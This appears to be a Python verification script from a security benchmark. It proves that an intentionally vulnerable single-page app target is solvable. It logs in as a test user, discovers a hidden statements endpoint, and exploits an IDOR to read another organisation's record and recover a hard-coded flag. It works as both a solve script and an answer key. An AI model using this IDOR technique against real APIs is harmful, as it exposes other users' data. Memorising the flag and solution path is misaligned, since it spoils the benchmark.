"""Deterministic solve-path check for spa_app.py — proves the XHR-surface IDOR is solvable (a broken
target would invalidate the bench). Stdlib only.

Run: docker run -d --rm --name sv -e APP=spa_app.py -p 5098:5000 vuln-target:latest
     ./.venv/bin/python targets/verify_spa.py   # then: docker rm -f sv
"""
import json, sys, urllib.request as u

B = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5098"
FLAG = "flag{sp4_xhr_1dor_cr0ss_org}"


def call(path, data=None, token=None):
    headers = {"Content-Type": "application/json"} if data is not None else {}
    if token:
        headers["Authorization"] = "Bearer " + token
    req = u.Request(B + path, data=json.dumps(data).encode() if data is not None else None,
                    headers=headers, method="POST" if data is not None else "GET")
    try:
        return json.loads(u.urlopen(req, timeout=8).read())
    except u.HTTPError as e:
        return json.loads(e.read())


def main():
    # 1. the index is a SPA shell that loads app.js; the data endpoint is NOT in the HTML
    html = u.urlopen(B + "/", timeout=8).read().decode()
    assert "app.js" in html and "statements" not in html, "index should be a JS shell"
    js = u.urlopen(B + "/static/app.js", timeout=8).read().decode()
    assert "/api/session" in js, "bundle should reveal the session/data flow"
    # 2. log in
    s = call("/api/login", data={"email": "alice@acme.io", "password": "s3curely"})
    tok = s.get("token"); assert tok and s["user_id"] == 1001, "login"
    # 3. session discloses the data endpoint; own statement discloses the counterparty id
    sess = call("/api/session", token=tok)
    ep = sess["statements_endpoint"]; assert ep == "/api/v2/statements"
    mine = call(f"{ep}/{sess['user_id']}", token=tok)
    victim_id = mine["counterparty"]["statement_id"]; assert victim_id == 2002
    # 4. IDOR: read another org's statement -> flag
    stolen = call(f"{ep}/{victim_id}", token=tok)
    assert stolen.get("settlement_token") == FLAG, "S-IDOR: cross-org read should leak the flag"
    print("verify_spa.py ok — SPA/XHR surface + IDOR solvable, flag recovered")


if __name__ == "__main__":
    main()
